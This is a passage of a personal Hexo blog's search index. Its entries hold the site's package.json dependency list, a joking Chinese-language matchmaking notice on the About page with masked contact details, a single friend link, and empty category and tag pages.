        <content type="html"><![CDATA[{"name":"hexo-site","version":"0.0.0","private":true,"scripts":{"build":"hexo generate","clean":"hexo clean","deploy":"hexo deploy","server":"hexo server","netlify":"hexo clean && hexo generate"},"hexo":{"version":"7.3.0"},"type":"module","dependencies":{"@renbaoshuo/markdown-it-katex":"^2.0.2","gitalk":"^1.8.0","gulp":"^5.0.0","gulp-htmlmin":"^5.0.1","hexo":"^7.3.0","hexo-abbrlink":"^2.2.1","hexo-autonofollow":"^1.0.1","hexo-browsersync":"^0.3.0","hexo-deployer-git":"^4.0.0","hexo-douban":"^2.3.6","hexo-generator-archive":"^2.0.0","hexo-generator-baidu-sitemap":"^0.1.9","hexo-generator-category":"^2.0.0","hexo-generator-feed":"^3.0.0","hexo-generator-index":"^4.0.0","hexo-generator-search":"^2.4.3","hexo-generator-sitemap":"^3.0.1","hexo-generator-tag":"^2.0.0","hexo-renderer-ejs":"^2.0.0","hexo-renderer-jade":"^0.5.0","hexo-renderer-markdown-it":"^7.1.1","hexo-renderer-stylus":"^3.0.1","hexo-server":"^3.0.0","hexo-theme-butterfly":"^5.2.2","hexo-theme-landscape":"^1.0.0","hexo-wordcount":"^6.0.1","katex":"^0.16.11","npm":"^10.9.1","workbox-build":"^7.1.1"},"devDependencies":{"@babel/core":"^7.25.2","@babel/preset-env":"^7.26.0","gulp-babel":"^8.0.0","gulp-clean-css":"^4.3.0","gulp-fontmin":"^0.7.4","gulp-htmlclean":"^2.7.22","gulp-imagemin":"^9.1.0","gulp-terser":"^2.1.0"}}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p>朋友的相亲信息</p><p>相亲启事</p><p>本人简介： 男，32 岁，身高 175cm，体重 70kg，性格温和，开朗大方。现居成都，从事互联网行业，工作稳定，收入可观。爱好运动、旅行、读书，平时也喜欢研究美食，享受生活中的点滴乐趣。朋友评价我是一个责任感强、懂得关心他人的人。</p><p>对未来伴侣的期望： 希望能找到一位性格开朗、善解人意、积极向上的女孩，年龄在 26-32 岁之间，身高 160cm 以上，身体健康，生活态度积极。希望她有稳定的工作和自己的兴趣爱好，能够在生活中彼此支持、共同成长。</p><p>婚姻观念： 我认为婚姻是一辈子的承诺，建立在彼此理解、尊重和包容的基础上。希望在今后的日子里，能与伴侣携手并肩，一起经历生活中的风雨和阳光，建立一个温馨、幸福的小家庭。</p><p>如果你也期待一段真挚、长久的感情，欢迎与我联系，一起创造属于我们的美好未来。</p><p>联系方式： 微信：xxxxxx 电话：xxxxxx</p><p>期待你的到来！</p><div class="gallery-container" data-type="data" data-button="">      <div class="gallery-data">[{"url":"/img/about/xq_1.jpg","alt":""},{"url":"/img/about/xq_2.jpg","alt":""},{"url":"/img/about/xq_3.jpg","alt":""},{"url":"/img/about/xq_4.jpg","alt":""},{"url":"/img/about/xq_5.jpg","alt":""}]</div>      <div class="gallery-items">      </div>    </div><p>（纯属娱乐，如有雷同，请勿当真）</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[<p>Error 的小破站：www.czyerror.top</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
